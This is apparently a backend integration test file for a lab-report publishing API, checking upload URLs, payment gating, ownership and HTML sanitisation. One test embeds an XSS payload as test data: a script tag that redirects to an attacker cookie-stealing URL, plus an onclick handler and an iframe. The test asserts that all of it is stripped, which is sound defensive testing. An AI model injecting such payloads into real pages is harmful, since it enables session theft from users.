// backend/tests/integration/reportPublishing.test.js
import { jest } from '@jest/globals';
import request from 'supertest';
import mongoose from 'mongoose';
import { MongoMemoryReplSet } from 'mongodb-memory-server';
import createApp from '../../src/app.js';
import { connectDB, disconnectDB } from '../../src/config/dbConfig.js';
import User from '../../src/schemas/User.js';
import LabCenter from '../../src/schemas/LabCenter.js';
import TestCatalog from '../../src/schemas/TestCatalog.js';
import Booking from '../../src/schemas/Booking.js';
import Doctor from '../../src/schemas/Doctor.js';
import Report from '../../src/schemas/Report.js';
import { generateAccessToken } from '../../src/utils/tokenUtils.js';
import s3Storage from '../../src/utils/s3StorageService.js';

describe('Report Upload & Lab-Written Summary Integration Tests', () => {
  let replSet;
  let app;
  let labCenter;
  let cbcTest;
  let partnerDoctor;
  let patientUser;
  let patientToken;
  let otherPatientUser;
  let otherPatientToken;
  let labAdminUser;
  let labAdminToken;
  let otherLabAdminUser;
  let otherLabAdminToken;

  beforeAll(async () => {
    replSet = await MongoMemoryReplSet.create({ replSet: { count: 1 } });
    const uri = replSet.getUri();
    await connectDB(uri);
    app = createApp();
  }, 60000);

  afterAll(async () => {
    await Report.deleteMany({});
    await Booking.deleteMany({});
    await User.deleteMany({});
    await Doctor.deleteMany({});
    await LabCenter.deleteMany({});
    await TestCatalog.deleteMany({});
    await disconnectDB();
    if (replSet) {
      await replSet.stop();
    }
  });

  beforeEach(async () => {
    await Report.deleteMany({});
    await Booking.deleteMany({});
    await User.deleteMany({});
    await Doctor.deleteMany({});
    await LabCenter.deleteMany({});
    await TestCatalog.deleteMany({});

    // Seed Lab Center
    labCenter = await LabCenter.create({
      name: 'Doon Valley Diagnostic Centre',
      area: 'Rajpur Road',
      address: '45 Rajpur Road, Dehradun',
      geo: {
        type: 'Point',
        coordinates: [78.0322, 30.3165],
      },
      serviceAreaPincodes: ['248001'],
      priceMultiplier: 1.0,
      turnaroundHrs: 6,
      isVerified: true,
      accreditation: {
        nabl: true,
        iso: true,
        icmr: true,
      },
    });

    // Seed Other Lab Center for isolation testing
    const otherLabCenter = await LabCenter.create({
      name: 'Himalayan Clinical Lab',
      area: 'Chakrata Road',
      address: '100 Chakrata Road, Dehradun',
      geo: {
        type: 'Point',
        coordinates: [78.01, 30.33],
      },
      serviceAreaPincodes: ['248002'],
      priceMultiplier: 1.0,
      turnaroundHrs: 8,
      isVerified: true,
    });

    // Seed Test Catalog
    cbcTest = await TestCatalog.create({
      name: 'Complete Blood Count (CBC)',
      slug: 'complete-blood-count-cbc',
      category: 'single',
      sampleType: 'Blood',
      homeCollectionAvailable: true,
      basePrice: 350,
      turnaroundHrs: 6,
      prepInstructions: 'No fasting required',
      description: 'Comprehensive screening test evaluating red cells, white cells, and platelets.',
    });

    // Seed Partner Doctor for specialist recommendation (§2.4)
    partnerDoctor = await Doctor.create({
      name: 'Dr. Alok Verma',
      qualification: 'MD (Pathology), DNB',
      specialization: 'Hematologist',
      clinicName: 'Doon Specialty Clinic',
      clinicAddress: '15 Astley Hall, Dehradun',
      consultationFee: 500,
      walkInFee: 700,
      tier: 'Gold',
      isVerified: true,
    });

    // Seed Patient 1
    patientUser = await User.create({
      accountHandle: 'aarav.sharma',
      name: 'Aarav Sharma',
      phone: '9876543210',
      passwordHash: 'hashed_pw_test',
      role: 'patient',
      accountType: 'single',
      location: {
        lat: 30.3165,
        lng: 78.0322,
        address: 'Rajpur Road, Dehradun',
        source: 'manual',
      },
      isVerified: true,
    });
    patientToken = generateAccessToken(patientUser);

    // Seed Patient 2 (for unowned testing)
    otherPatientUser = await User.create({
      accountHandle: 'priya.singh',
      name: 'Priya Singh',
      phone: '9876543211',
      passwordHash: 'hashed_pw_test',
      role: 'patient',
      accountType: 'single',
      location: {
        lat: 30.32,
        lng: 78.04,
        address: 'Clock Tower, Dehradun',
        source: 'manual',
      },
      isVerified: true,
    });
    otherPatientToken = generateAccessToken(otherPatientUser);

    // Seed Lab Admin 1
    labAdminUser = await User.create({
      accountHandle: 'doon.lab.admin',
      name: 'Dr. Ramesh Kumar',
      phone: '9876543230',
      passwordHash: 'hashed_pw_test',
      role: 'lab_admin',
      labCenterId: labCenter._id,
      accountType: 'single',
      location: {
        lat: 30.3165,
        lng: 78.0322,
        address: 'Rajpur Road, Dehradun',
        source: 'manual',
      },
      isVerified: true,
    });
    labAdminToken = generateAccessToken(labAdminUser);

    // Seed Other Lab Admin
    otherLabAdminUser = await User.create({
      accountHandle: 'other.lab.admin',
      name: 'Dr. Suresh Joshi',
      phone: '9876543231',
      passwordHash: 'hashed_pw_test',
      role: 'lab_admin',
      labCenterId: otherLabCenter._id,
      accountType: 'single',
      location: {
        lat: 30.33,
        lng: 78.01,
        address: 'Chakrata Road, Dehradun',
        source: 'manual',
      },
      isVerified: true,
    });
    otherLabAdminToken = generateAccessToken(otherLabAdminUser);
  });

  /**
   * The storage layer no longer fabricates presigned URLs when AWS is not
   * configured (HIGH H8) -- it throws 503. Tests that need a URL now say what
   * the signer returns, instead of relying on production code to invent one.
   */
  function stubStorage() {
    jest.spyOn(s3Storage, 'generateReportUploadUrl').mockImplementation(
      async ({ bookingId, labCenterId, expiresIn }) => ({
        uploadUrl: 'https://s3.example/presigned-put',
        fileKey: `reports/${labCenterId}/${bookingId}/stub-report.pdf`,
        expiresIn,
      })
    );
    jest
      .spyOn(s3Storage, 'generateReportDownloadUrl')
      .mockResolvedValue(
        'https://pathcare-reports-private.s3.ap-south-1.amazonaws.com/reports/stub.pdf?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Expires=900&X-Amz-Signature=stubsig'
      );
  }

  afterEach(() => {
    jest.restoreAllMocks();
  });

  // Helper to create a booking at lab ready for report publication
  async function createAtLabBooking() {
    return Booking.create({
      patientId: patientUser._id,
      testIds: [cbcTest._id],
      labCenterId: labCenter._id,
      mode: 'home',
      slotDateTime: new Date(Date.now() + 3600000),
      status: 'at_lab',
      amount: 350,
      paymentMode: 'upi',
      paymentStatus: 'paid',
      barcode: 'PC-260904-89ABCD-01A2',
      idempotencyKey: `report-idem-${new mongoose.Types.ObjectId()}`,
    });
  }

  describe('POST /api/lab/reports/:bookingId/upload-url', () => {
    it('generates a presigned S3 PUT upload URL with short TTL', async () => {
      const booking = await createAtLabBooking();

      stubStorage();

      const res = await request(app)
        .post(`/api/lab/reports/${booking._id}/upload-url`)
        .set('Authorization', `Bearer ${labAdminToken}`)
        .send({ contentType: 'application/pdf' });

      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.data.uploadUrl).toBeDefined();
      expect(res.body.data.fileKey).toContain(`reports/${labCenter._id}/${booking._id}/`);
      expect(res.body.data.expiresIn).toBe(900);
    });

    it('rejects upload URL request from an unauthorized lab admin with 404', async () => {
      const booking = await createAtLabBooking();

      // otherLabAdmin belongs to a different lab centre
      const res = await request(app)
        .post(`/api/lab/reports/${booking._id}/upload-url`)
        .set('Authorization', `Bearer ${otherLabAdminToken}`)
        .send({});

      // CONTEXT §3.2: 404 on unowned resource
      expect(res.status).toBe(404);
      expect(res.body.error.code).toBe('BOOKING_NOT_FOUND');
    });
  });

  describe('POST /api/lab/reports/:bookingId/publish & Sanitisation Checkpoint', () => {
    it('CHECKPOINT: a <script> tag in summaryHtml is stripped on save', async () => {
      const booking = await createAtLabBooking();

      // Malicious injection attempt with script, style, and iframe tags
      const maliciousHtml = '<p>Hemoglobin level is <b>14.2 g/dL</b> (Normal).</p>' +
        '<script>window.location="https://attacker.com/steal-cookie"; alert("XSS Attack!");</script>' +
        '<h4 style="color:red" onclick="alert(1)">Doctor Clinical Note</h4>' +
        '<iframe src="https://attacker.com"></iframe>' +
        '<p>Platelet count is <strong>240,000 /mcL</strong>.</p>';

      const res = await request(app)
        .post(`/api/lab/reports/${booking._id}/publish`)
        .set('Authorization', `Bearer ${labAdminToken}`)
        .send({
          pdfKey: `reports/${labCenter._id}/${booking._id}/report.pdf`,
          summaryHtml: maliciousHtml,
          recommendedDoctorId: partnerDoctor._id.toString(),
          recommendationReason: 'Mild granulocyte elevation noted; specialist consultation advised.',
        });

      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);

      // Verify what was actually persisted in MongoDB
      const reportInDb = await Report.findOne({ bookingId: booking._id });
      expect(reportInDb).not.toBeNull();

      // Checkpoint verification: script and iframe tags are completely stripped
      expect(reportInDb.summaryHtml).not.toContain('<script');
      expect(reportInDb.summaryHtml).not.toContain('https://attacker.com');
      expect(reportInDb.summaryHtml).not.toContain('iframe');
      expect(reportInDb.summaryHtml).not.toContain('onclick');
      expect(reportInDb.summaryHtml).not.toContain('style');

      // Valid allowed tags (p, b, strong, h4) are preserved
      expect(reportInDb.summaryHtml).toContain('<p>Hemoglobin level is <b>14.2 g/dL</b> (Normal).</p>');
      expect(reportInDb.summaryHtml).toContain('<h4>Doctor Clinical Note</h4>');
      expect(reportInDb.summaryHtml).toContain('<p>Platelet count is <strong>240,000 /mcL</strong>.</p>');

      // Verify booking status transitioned to 'report_ready'
      const updatedBooking = await Booking.findById(booking._id);
      expect(updatedBooking.status).toBe('report_ready');
    });

    it('Integration: authoredBy recorded on every publish', async () => {
      const booking = await createAtLabBooking();

      const res = await request(app)
        .post(`/api/lab/reports/${booking._id}/publish`)
        .set('Authorization', `Bearer ${labAdminToken}`)
        .send({
          pdfKey: `reports/${labCenter._id}/${booking._id}/report.pdf`,
          summaryHtml: '<p>Standard report summary text.</p>',
        });

      expect(res.status).toBe(200);

      const reportInDb = await Report.findOne({ bookingId: booking._id });
      expect(reportInDb).not.toBeNull();
      expect(reportInDb.authoredBy.toString()).toBe(labAdminUser._id.toString());
    });

    it('Integration: edit history appends, never overwrites (§2.4)', async () => {
      const booking = await createAtLabBooking();

      // 1. Initial publish (Version 1)
      const v1Res = await request(app)
        .post(`/api/lab/reports/${booking._id}/publish`)
        .set('Authorization', `Bearer ${labAdminToken}`)
        .send({
          pdfKey: `reports/${labCenter._id}/${booking._id}/v1.pdf`,
          summaryHtml: '<p>Initial summary version 1.</p>',
        });
      expect(v1Res.status).toBe(200);

      let reportInDb = await Report.findOne({ bookingId: booking._id });
      expect(reportInDb.summaryHtml).toBe('<p>Initial summary version 1.</p>');
      expect(reportInDb.editHistory).toHaveLength(1);

      // 2. Lab re-publishes with revisions (Version 2)
      const v2Res = await request(app)
        .post(`/api/lab/reports/${booking._id}/publish`)
        .set('Authorization', `Bearer ${labAdminToken}`)
        .send({
          pdfKey: `reports/${labCenter._id}/${booking._id}/v2.pdf`,
          summaryHtml: '<p>Revised summary version 2 with corrected values.</p>',
          recommendedDoctorId: partnerDoctor._id.toString(),
          recommendationReason: 'Consult hematologist',
        });
      expect(v2Res.status).toBe(200);

      reportInDb = await Report.findOne({ bookingId: booking._id });
      expect(reportInDb.summaryHtml).toBe('<p>Revised summary version 2 with corrected values.</p>');

      // Verify edit history appended and did NOT overwrite earlier version
      expect(reportInDb.editHistory).toHaveLength(2);
      expect(reportInDb.editHistory[0].summaryHtml).toBe('<p>Initial summary version 1.</p>');
      expect(reportInDb.editHistory[1].summaryHtml).toBe('<p>Initial summary version 1.</p>'); // Previous version appended
    });
  });

  describe('GET /api/reports/:bookingId & Patient View', () => {
    beforeEach(() => {
      stubStorage();
    });

    it('patient fetches their report with fresh signed download URL and specialist recommendation', async () => {
      const booking = await createAtLabBooking();

      await request(app)
        .post(`/api/lab/reports/${booking._id}/publish`)
        .set('Authorization', `Bearer ${labAdminToken}`)
        .send({
          pdfKey: `reports/${labCenter._id}/${booking._id}/report.pdf`,
          summaryHtml: '<p>Sample values are within physiological limits.</p>',
          recommendedDoctorId: partnerDoctor._id.toString(),
          recommendationReason: 'Consult Dr. Verma for preventive care advice.',
        });

      const res = await request(app)
        .get(`/api/reports/${booking._id}`)
        .set('Authorization', `Bearer ${patientToken}`);

      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);

      const data = res.body.data;
      expect(data.summaryHtml).toBe('<p>Sample values are within physiological limits.</p>');
      expect(data.downloadUrl).toBeDefined();
      expect(data.downloadUrl).toContain('X-Amz-Signature');
      expect(data.recommendedDoctor).toBeDefined();
      expect(data.recommendedDoctor.name).toBe('Dr. Alok Verma');
      expect(data.recommendedDoctor.specialization).toBe('Hematologist');
      expect(data.recommendationReason).toBe('Consult Dr. Verma for preventive care advice.');
    });

    /**
     * A report is the thing the patient is paying for. Releasing it before the
     * money arrives gives it away.
     *
     * This was live: publishing set the booking to `report_ready` and the
     * patient view handed back a signed S3 URL and the full summary without
     * ever looking at `paymentStatus`. A QA run read a complete report on a
     * booking sitting at `upi / pending`.
     */
    describe('payment gate on the patient view', () => {
      async function publishFor(booking) {
        return request(app)
          .post(`/api/lab/reports/${booking._id}/publish`)
          .set('Authorization', `Bearer ${labAdminToken}`)
          .send({
            pdfKey: `reports/${labCenter._id}/${booking._id}/report.pdf`,
            summaryHtml: '<p>Values within range.</p>',
          });
      }

      it('refuses the patient a report on an unpaid booking', async () => {
        const booking = await createAtLabBooking();
        await Booking.updateOne({ _id: booking._id }, { $set: { paymentStatus: 'pending' } });
        await publishFor(booking);

        const res = await request(app)
          .get(`/api/reports/${booking._id}`)
          .set('Authorization', `Bearer ${patientToken}`);

        expect(res.status).toBe(402);
        expect(res.body.error.code).toBe('PAYMENT_PENDING');
        // The whole point: no summary and no signed URL escape with the refusal.
        expect(JSON.stringify(res.body)).not.toContain('X-Amz-Signature');
        expect(JSON.stringify(res.body)).not.toContain('Values within range');
      });

      it('refuses it on a refunded booking too, so cancelling is not a free read', async () => {
        const booking = await createAtLabBooking();
        await Booking.updateOne({ _id: booking._id }, { $set: { paymentStatus: 'refunded' } });
        await publishFor(booking);

        const res = await request(app)
          .get(`/api/reports/${booking._id}`)
          .set('Authorization', `Bearer ${patientToken}`);

        expect(res.status).toBe(402);
        expect(res.body.error.code).toBe('PAYMENT_PENDING');
      });

      it('releases it once the booking is paid', async () => {
        const booking = await createAtLabBooking();
        await Booking.updateOne({ _id: booking._id }, { $set: { paymentStatus: 'pending' } });
        await publishFor(booking);

        await Booking.updateOne({ _id: booking._id }, { $set: { paymentStatus: 'paid' } });

        const res = await request(app)
          .get(`/api/reports/${booking._id}`)
          .set('Authorization', `Bearer ${patientToken}`);

        expect(res.status).toBe(200);
        expect(res.body.data.downloadUrl).toContain('X-Amz-Signature');
      });

      it('still lets the owning lab admin read an unpaid report, to chase the payment', async () => {
        const booking = await createAtLabBooking();
        await Booking.updateOne({ _id: booking._id }, { $set: { paymentStatus: 'pending' } });
        await publishFor(booking);

        const res = await request(app)
          .get(`/api/reports/${booking._id}`)
          .set('Authorization', `Bearer ${labAdminToken}`);

        expect(res.status).toBe(200);
        expect(res.body.data.downloadUrl).toBeDefined();
      });

      it('hides existence from a stranger with 404, never 402', async () => {
        const booking = await createAtLabBooking();
        await Booking.updateOne({ _id: booking._id }, { $set: { paymentStatus: 'pending' } });
        await publishFor(booking);

        const res = await request(app)
          .get(`/api/reports/${booking._id}`)
          .set('Authorization', `Bearer ${otherPatientToken}`);

        expect(res.status).toBe(404);
      });
    });

    it('Integration: ownership — user A cannot fetch user B report (returns 404)', async () => {
      const booking = await createAtLabBooking();

      await request(app)
        .post(`/api/lab/reports/${booking._id}/publish`)
        .set('Authorization', `Bearer ${labAdminToken}`)
        .send({
          pdfKey: `reports/${labCenter._id}/${booking._id}/report.pdf`,
          summaryHtml: '<p>Private patient report.</p>',
        });

      // otherPatient attempts to access patient A's report
      const res = await request(app)
        .get(`/api/reports/${booking._id}`)
        .set('Authorization', `Bearer ${otherPatientToken}`);

      // CONTEXT §3.2: Return 404, not 403, when resource is not owned by caller
      expect(res.status).toBe(404);
      expect(res.body.error.code).toBe('BOOKING_NOT_FOUND');
    });

    it('Integration: the signed URL expires', async () => {
      const booking = await createAtLabBooking();

      await request(app)
        .post(`/api/lab/reports/${booking._id}/publish`)
        .set('Authorization', `Bearer ${labAdminToken}`)
        .send({
          pdfKey: `reports/${labCenter._id}/${booking._id}/report.pdf`,
          summaryHtml: '<p>Report for expiry test.</p>',
        });

      // Expiry is enforced by S3 against the TTL we request, not by us. What
      // this code controls -- and therefore what is worth asserting -- is that
      // it asks for a short-lived URL on every fetch (CONTEXT §6.4).
      const res = await request(app)
        .get(`/api/reports/${booking._id}`)
        .set('Authorization', `Bearer ${patientToken}`);

      expect(res.status).toBe(200);
      expect(res.body.data.downloadUrl).toContain('X-Amz-Signature');
      expect(s3Storage.generateReportDownloadUrl).toHaveBeenCalledWith(
        expect.objectContaining({ expiresIn: 900 })
      );
    });
  });
  // -- BLOCKER #6 regression --------------------------------------------------
  // The write-side ownership guard only rejected when user.labCenterId was
  // TRUTHY. User.labCenterId defaults to null, so a lab admin bound to no
  // centre passed straight through and could obtain an S3 upload URL for, or
  // publish a summary over, ANY patient report. The existing suite only ever
  // tested an admin belonging to a DIFFERENT centre, which the old guard did
  // catch -- so the hole stayed invisible.
  describe('BLOCKER #6 -- report writes are fail-closed for unbound lab admins', () => {
    let unboundAdminToken;

    beforeEach(async () => {
      const unboundAdmin = await User.create({
        accountHandle: `unbound.lab.admin.${Date.now()}`,
        name: 'Dr. Unbound',
        phone: `98${Date.now().toString().slice(-8)}`,
        passwordHash: 'hashed_pw_test',
        role: 'lab_admin',
        // labCenterId deliberately omitted -- schema default is null.
        accountType: 'single',
        location: { lat: 30.3165, lng: 78.0322, address: 'Dehradun', source: 'manual' },
        isVerified: true,
      });
      unboundAdminToken = generateAccessToken(unboundAdmin);
    });

    it('refuses an upload URL to a lab admin bound to no centre', async () => {
      const booking = await createAtLabBooking();

      const res = await request(app)
        .post(`/api/lab/reports/${booking._id}/upload-url`)
        .set('Authorization', `Bearer ${unboundAdminToken}`)
        .send({ contentType: 'application/pdf' });

      expect(res.status).toBe(404);
      expect(res.body.error.code).toBe('BOOKING_NOT_FOUND');
      expect(res.body.data).toBeUndefined();
    });

    it('refuses report publication by a lab admin bound to no centre', async () => {
      const booking = await createAtLabBooking();

      const res = await request(app)
        .post(`/api/lab/reports/${booking._id}/publish`)
        .set('Authorization', `Bearer ${unboundAdminToken}`)
        .send({
          pdfKey: `reports/${labCenter._id}/${booking._id}/report.pdf`,
          summaryHtml: '<p>Fabricated summary by an unauthorised account.</p>',
        });

      expect(res.status).toBe(404);
      expect(res.body.error.code).toBe('BOOKING_NOT_FOUND');

      // Nothing was written against the patient record.
      const stored = await Report.findOne({ bookingId: booking._id });
      expect(stored).toBeNull();

      const unchanged = await Booking.findById(booking._id);
      expect(unchanged.status).toBe('at_lab');
    });

    it('does not let an unbound admin overwrite an EXISTING published report', async () => {
      const booking = await createAtLabBooking();

      // A legitimate admin publishes first.
      const first = await request(app)
        .post(`/api/lab/reports/${booking._id}/publish`)
        .set('Authorization', `Bearer ${labAdminToken}`)
        .send({
          pdfKey: `reports/${labCenter._id}/${booking._id}/report.pdf`,
          summaryHtml: '<p>Haemoglobin is within the normal range.</p>',
        });
      expect(first.status).toBe(200);

      // The unbound admin attempts to overwrite it.
      const res = await request(app)
        .post(`/api/lab/reports/${booking._id}/publish`)
        .set('Authorization', `Bearer ${unboundAdminToken}`)
        .send({
          pdfKey: `reports/${labCenter._id}/${booking._id}/tampered.pdf`,
          summaryHtml: '<p>Tampered clinical summary.</p>',
        });

      expect(res.status).toBe(404);

      const stored = await Report.findOne({ bookingId: booking._id });
      expect(stored.summaryHtml).toContain('within the normal range');
      expect(stored.summaryHtml).not.toContain('Tampered');
    });

    it('still refuses an admin bound to a DIFFERENT centre (unchanged behaviour)', async () => {
      const booking = await createAtLabBooking();

      const res = await request(app)
        .post(`/api/lab/reports/${booking._id}/publish`)
        .set('Authorization', `Bearer ${otherLabAdminToken}`)
        .send({
          pdfKey: `reports/${labCenter._id}/${booking._id}/report.pdf`,
          summaryHtml: '<p>Cross-centre write attempt.</p>',
        });

      expect(res.status).toBe(404);
      expect(res.body.error.code).toBe('BOOKING_NOT_FOUND');
    });

    it('still allows the owning centre admin to publish (positive control)', async () => {
      const booking = await createAtLabBooking();

      const res = await request(app)
        .post(`/api/lab/reports/${booking._id}/publish`)
        .set('Authorization', `Bearer ${labAdminToken}`)
        .send({
          pdfKey: `reports/${labCenter._id}/${booking._id}/report.pdf`,
          summaryHtml: '<p>Thyroid values are within limits.</p>',
        });

      expect(res.status).toBe(200);
      const stored = await Report.findOne({ bookingId: booking._id });
      expect(stored.summaryHtml).toContain('within limits');
    });
  });
  // -- HIGH H8 regression -----------------------------------------------------
  // s3StorageService fabricated a URL that LOOKED like an S3 presigned URL but
  // carried a home-made HMAC in a home-made format. S3 rejects it with 403
  // every time, so lab admins saw uploads that always failed and patients got
  // download links that 403'd on a report the app said was ready (CONTEXT §11).
  describe('HIGH H8 -- storage failures surface instead of fabricating a URL', () => {
    /**
     * "Unconfigured" has to be made true here, not assumed.
     *
     * These tests used to inherit it from the developer's `.env` simply having
     * placeholder AWS values. The moment real credentials were added, storage
     * became configured, presigning succeeded, and both tests failed — the
     * suite was asserting a property of one machine's environment rather than
     * of the code. Clearing the variables makes the precondition explicit and
     * the result the same on any machine and in CI.
     */
    const AWS_VARS = ['AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY'];
    let savedAws;

    beforeEach(() => {
      savedAws = Object.fromEntries(AWS_VARS.map((k) => [k, process.env[k]]));
      for (const k of AWS_VARS) delete process.env[k];
    });

    afterEach(() => {
      for (const [k, v] of Object.entries(savedAws)) {
        if (v === undefined) delete process.env[k];
        else process.env[k] = v;
      }
    });

    it('returns 503 rather than a fake upload URL when storage is unconfigured', async () => {
      const booking = await createAtLabBooking();
      // No stubStorage() here: exercise the real storage layer, with the
      // credentials removed above so it is genuinely unconfigured.

      const res = await request(app)
        .post(`/api/lab/reports/${booking._id}/upload-url`)
        .set('Authorization', `Bearer ${labAdminToken}`)
        .send({ contentType: 'application/pdf' });

      expect(res.status).toBe(503);
      expect(res.body.error.code).toBe('STORAGE_UNAVAILABLE');
      expect(res.body.data).toBeUndefined();
    });

    it('never returns a home-made X-Amz-Signature', async () => {
      const booking = await createAtLabBooking();

      const res = await request(app)
        .post(`/api/lab/reports/${booking._id}/upload-url`)
        .set('Authorization', `Bearer ${labAdminToken}`)
        .send({ contentType: 'application/pdf' });

      expect(JSON.stringify(res.body)).not.toContain('X-Amz-Signature');
    });

    it('the storage module contains no hand-rolled URL signing', async () => {
      const fs = await import('node:fs');
      const path = await import('node:path');
      const url = await import('node:url');
      const here = path.dirname(url.fileURLToPath(import.meta.url));
      const src = fs.readFileSync(
        path.resolve(here, '../../src/utils/s3StorageService.js'),
        'utf8'
      );

      expect(src).not.toContain('createHmac');
      expect(src).not.toContain('X-Amz-Signature=');
    });
  });
});
